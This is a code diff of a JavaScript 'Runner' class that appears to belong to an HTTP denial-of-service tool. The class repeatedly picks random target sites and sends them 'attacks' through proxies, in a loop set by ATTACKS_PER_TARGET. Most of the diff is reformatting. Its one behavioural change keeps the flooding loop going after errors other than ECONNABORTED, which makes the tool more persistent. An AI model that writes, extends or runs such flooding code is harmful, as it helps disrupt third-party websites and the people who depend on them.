@@ -5,57 +5,59 @@ const { generateRequestHeaders } = require('./headers-utils');
 const { getProxyObj } = require('./proxy-utils');
 
 class Runner {
-  constructor (props) {
-    this.sites = props.sites
-    this.proxies = props.proxies
-    this.onlyProxy = props.onlyProxy
-    this.eventSource = new EventEmitter()
+	constructor(props) {
+		this.sites = props.sites
+		this.proxies = props.proxies
+		this.onlyProxy = props.onlyProxy
+		this.eventSource = new EventEmitter()
 		this.ATTACKS_PER_TARGET = process.env.ATTACKS_PER_TARGET;
 		this.proxy = null;
-  }
+	}
 
-	async start () {
-    this.active = true
-    while (this.active) {
-      try {
-        await this.sendTroops()
-      } catch (error) {
-        this.active = false
-        throw error
-      }
-    }
-  }
+	async start() {
+		this.active = true
+		while (this.active) {
+			try {
+				await this.sendTroops()
+			} catch (error) {
+				this.active = false
+				throw error
+			}
+		}
+	}
 
-  stop () {
-    this.active = false
-  }
+	stop() {
+		this.active = false
+	}
 
-  setProxyActive(newProxyValue) {
-    this.onlyProxy = newProxyValue
-  }
+	setProxyActive(newProxyValue) {
+		this.onlyProxy = newProxyValue
+	}
 
-	updateConfiguration (config) {
-    this.sites = config.sites
-    this.proxies = config.proxies
-  }
+	updateConfiguration(config) {
+		this.sites = config.sites
+		this.proxies = config.proxies
+	}
 
-	async sendTroops () {
+	async sendTroops() {
 		const target = {
 			site: this.sites[getRandomInt(this.sites.length)],
-      proxy: this.proxies
-    };
+			proxy: this.proxies
+		};
 
 		for (let attackIndex = 0; (attackIndex < this.ATTACKS_PER_TARGET); attackIndex++) {
 			if (!this.active) {
-        break;
-      }
+				break;
+			}
 
 			try {
 				await this.attack(target);
-			} catch(e) {
+			} catch (e) {
 				this.proxy = null;
 				this.handleError(e, target);
-				break;
+				if (e.code === 'ECONNABORTED') {
+					break;
+				}
 			}
 		}
 	}
@@ -74,7 +76,7 @@ class Runner {
 		});
 
 		this.eventSource.emit(
-			'attack', 
+			'attack',
 			{ url: target.site.page, log: `${target.site.page} | PROXY | ${r.status}` },
 		);
 
